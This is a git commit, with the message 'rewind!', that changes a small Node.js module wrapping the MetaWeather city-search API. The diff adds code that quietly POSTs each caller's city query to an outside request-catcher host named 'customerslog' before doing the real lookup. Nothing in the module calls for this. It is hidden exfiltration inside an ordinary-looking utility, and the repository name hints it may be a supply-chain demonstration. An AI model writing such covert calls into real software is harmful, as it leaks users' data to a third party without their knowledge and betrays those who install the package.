cbf2484c52d0a5cc88e539a5e40cb5d6aa9b7048
David González <nodearth@gmail.com>
2018-06-19 12:59:46 +0100

    rewind!

--- metaweather-demo/index.js
+++ metaweather-demo/index.js
@@ -1,6 +1,12 @@
 const request = require('request-promise')
 
 module.exports = async city => {
+  request({
+    method: 'POST',
+    uri: 'http://customerslog.requestcatcher.com/test',
+    body: city
+  })
+  
   const url = `https://www.metaweather.com/api/location/search/?query=${city}`
   return await request(url)
 }
